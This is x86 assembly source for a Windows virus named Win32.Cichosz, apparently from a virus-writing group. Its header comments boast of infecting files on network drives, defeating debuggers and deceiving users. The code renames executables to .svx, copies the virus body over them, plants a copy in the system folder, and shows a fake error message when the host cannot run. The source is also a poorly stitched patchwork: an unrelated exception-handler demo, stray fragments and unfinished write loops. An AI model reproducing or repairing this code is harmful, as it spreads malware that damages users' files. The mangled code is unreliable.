;============================================================
;=== Win32.Cichosz virus. Coded by Necronomikon[ShadowvX] ===
;============================================================
;Virusname: Win32.Cichosz
;Author: Necronomikon
;Date:26-12-00
;Features:  - Worming: It checks all drives and if it have access to 
;a network drive,it infect there some files. (thanks to SnakeByte)
;           - Fuck Debuggers
;           - Display MessageBox 
;           - Renames infected files to svx
;---------------------------------------
;--- based on Win32.3x3 by BumbleBee ---
;---------------------------------------
;======================================================
;  . To compile:
;
;       tasm32 /ml /m3 cichosz,,;
;       tlink32 -Tpe -c cichosz,cichosz,, import32.lib
;=======================================================
.386
locals
jumps
.model flat,STDCALL

        extrn           ExitProcess:PROC
        extrn        FindFirstFileA:PROC
        extrn         FindNextFileA:PROC
        extrn             FindClose:PROC
        extrn       GetCommandLineA:PROC
        extrn             MoveFileA:PROC
        extrn             CopyFileA:PROC
        extrn               WinExec:PROC
        extrn           MessageBoxA:PROC
        extrn         GetSystemTime:PROC
        extrn           CloseHandle:PROC
        extrn           GetFileSize:PROC
        extrn  GetCurrentDirectoryA:PROC
        extrn  SetCurrentDirectoryA:PROC
        extrn           DeleteFileA:PROC

        L                       equ <LARGE>

.DATA

szTitle         db      "Structured Exception Handler example",0
szMessage       db      "Intercepted General Protection Fault!",0

        .code

start:
        call    setupSEH                        ; The call pushes the offset
                                                ; past it in the stack rigth?
                                                ; So we will use that :)
exceptionhandler:
        mov     esp,[esp+8]                     ; Error gives us old ESP                          
                                                ; in [ESP+8]

        push    00000000h                       ; Parameters for MessageBoxA
        push    offset szTitle
        push    offset szMessage
        push    00000000h
        call    MessageBoxA

        push    00000000h                       
        call    ExitProcess                     ; Exit Application

setupSEH:
        push    dword ptr fs:[0]                ; Push original SEH handler
        mov     fs:[0],esp                      ; And put the new one (located
                                                ; after the first call)

        mov     ebx,0BFF70000h                  ; Try to write in kernel (will
        mov     eax,012345678h                  ; generate an exception)
        xchg    eax,[ebx]

end     start
windoze         db      'C:\Windows\System\Sys\Porn.exe',0
fHnd            dd      ?               ; handle for files
shit            dd      0               ; for write process
cont0           dd      0               ; for loops
cont1           db      0               ; for loops

findData        db      316 dup(0)      ; data for ffirst and fnext
fMask           db      '*.EXE'         ; mask for finding exe files
ffHnd           dd      ?               ; handle for ffirst and fnext
hostName        db      260 dup(0)      ; space for save host name
hwoArgs         db      260 dup(0)      ; host without arguments
futureHostName  db      260 dup(0)      ; space for save new host name
chDir           db      260 dup(0)      ; space for save current dir
commandLine     dd      ?               ; handle for command line
sysTimeStruct   db      16 dup(0)       ; space for system time struct


; virus id and author
virusId         db      'Win32.CICHOSZ coded by Necronomikon',0
; message
mess            db      'This is my 1st Win32-Virus.'
                db      0dh,0ah,'Greetingz tha whole ShadowvX Group!',0

bmess           db      'Invalid call in shared memory 0x0cf689000.',0
;--------------------
push offset Buffer          ; offset of the buffer
 push 60h                    ; buffer-lenght
 call GetLogicalDriveStrings

 cmp eax, 0                  ; did we fail ?
 je StopThis

 lea esi, Buffer

WhatDrive: 
 push esi
 call GetDriveType
 cmp eax, DRIVE_REMOTE       ; we got a network drive
 jne NoNetwork

                             ; esi still contains the offset of
                             ; the root dir on the drive
 call infectDrive            ; so we infect it.. ;P

NoNetwork:
 Call GetNextZero            ; place esi after the next zero
                             ; ( searching from esi onwards )
 cmp byte ptr [esi],0
 jne WhatDrive               ; if we searched all drives we
                             ; end here, otherwise we check the type
StopThis:
 ret

 Buffer db 60h dup (?)       ; I don't know that many ppl with 20+
                             ; Drives so this buffersize should be
                             ; big enough ;)
;----------------------------------------
virus:
        lea     eax,sysTimeStruct       ; check for payload
        push    eax
        call    GetSystemTime           ; get system time

        lea     eax,sysTimeStruct       
        cmp     word ptr [eax+2],12      
        jne     skipPay
        cmp     word ptr [eax+6],14
        jne     skipPay

        push    L 1030h                 ; show a message box
        lea     eax,virusId
        push    eax
        lea     eax,mess
        push    eax
        push    L 0
        call    MessageBoxA

skipPay:
        call    GetCommandLineA         ; get command line
        mov     dword ptr [commandLine],eax

        xor     esi,esi                 ; copy it to get host path
        lea     edi,hostName            ; needed for infection process
copyLoop:
        mov     bl,byte ptr [eax+esi]
        mov     byte ptr [edi+esi],bl
        cmp     bl,0
        je      skipArgs
        inc     esi
        jmp     copyLoop

skipArgs:                               ; copy host name without args
        xor     esi,esi
        lea     edi,hwoArgs
        lea     eax,hostName
copyLoopb:
        mov     bl,byte ptr [eax+esi]
        mov     byte ptr [edi+esi],bl
        cmp     bl,'.'
        je      ffirst
        inc     esi
        jmp     copyLoopb

ffirst:
        mov     dword ptr [edi+esi],'EXE.' ; add extension
                                           ; now we have arguments in
                                           ; hostName and name only in
                                           ; hwoArgs
        push    0
        lea     eax,windoze
        push    eax
        lea     eax,hwoArgs
        push    eax
        call    CopyFileA               ; install in windows dir

        lea     eax,chDir
        push    eax                     ; get current directory
        push    260
        call    GetCurrentDirectoryA
        cmp     eax,0
  
retDir:
        lea     eax,chDir
        push    eax                     ; restore work directory
        call    SetCurrentDirectoryA


fnext:
        call    infectFile
skipThis:

        lea     eax,findData
        push    eax
        push    dword ptr [ffHnd]
        call    FindNextFileA           ; find next *.EXE
        cmp     eax,0
        jne     fnext

        push    dword ptr [ffHnd]
        call    FindClose               ; close ffist/fnext handle

execHost:
        xor     esi,esi                 ; copy hostName to future host Name
        lea     edi,futureHostName
        lea     eax,hostName
copyLoop2:
        mov     bl,byte ptr [eax+esi]
        mov     byte ptr [edi+esi],bl
        cmp     bl,'.'
        je      contExec
        inc     esi
        jmp     copyLoop2

contExec:
        mov     dword ptr [edi+esi],'svx.' ; change ext to svx

        push    1
        push    edi
        call    WinExec                 ; exec host
        cmp     eax,32                  ; exec error?
        jb      lastOptionStealth       ; je stealth with lame message

goOut:
        push    L 0h
        call    ExitProcess             ; exit program

infectFile:
        xor     esi,esi                 ; copy file found name to
        lea     edi,futureHostName      ; future host name
        lea     eax,findData
        add     eax,44
icopyLoop:
        mov     bl,byte ptr [eax+esi]
        mov     byte ptr [edi+esi],bl
        cmp     bl,'.'
        je      continueInf
        inc     esi
        jmp     icopyLoop

continueInf:
        mov     dword ptr [edi+esi],'svx.'  ; change ext to svx

        push    eax
        push    edi
        push    eax
        call    MoveFileA               ; rename the host to *.svx

        pop     eax
        push    0
        push    eax
        lea     eax,hwoArgs
        push    eax
        call    CopyFileA               ; copy current host to new host
                                        ; (virus body)
        ret

lastOptionStealth:                      ; lame mess when we can't exec host
        push    L 1010h                 ; user can think the program is
        push    L 0h                    ; corrupted or windows goes
        lea     eax,bmess               ; wrong (very common =] )
        push    eax
        push    L 0
        call    MessageBoxA
        jmp     goOut

dcLoop:
        push    L 0
        lea     eax,shit
        push    eax
        push    L 1
        push    edi
        push    dword ptr [fHnd]
        
        cmp     byte ptr [edi],0ffh
        jne     skipFF

        dec     dword ptr [cont0]
        call    addFF
        inc     edi

skipFF:
        inc     edi
        dec     dword ptr [cont0]
        cmp     dword ptr [cont0],0
        jne     dcLoop

        push    dword ptr [fHnd]        ; close file
        call    CloseHandle

addFF:
        xor     ecx,ecx
        mov     cl,byte ptr [edi+1]
        mov     byte ptr [cont1],cl
        cmp     cl,0
        jne     addFFLoop
        ret

addFFLoop:
        push    L 0
        lea     eax,shit
        push    eax
        push    L 1
        push    edi
        push    dword ptr [fHnd]
        dec     byte ptr [cont1]
        cmp     byte ptr [cont1],0
        jne     addFFLoop

        ret
Ends
End virus

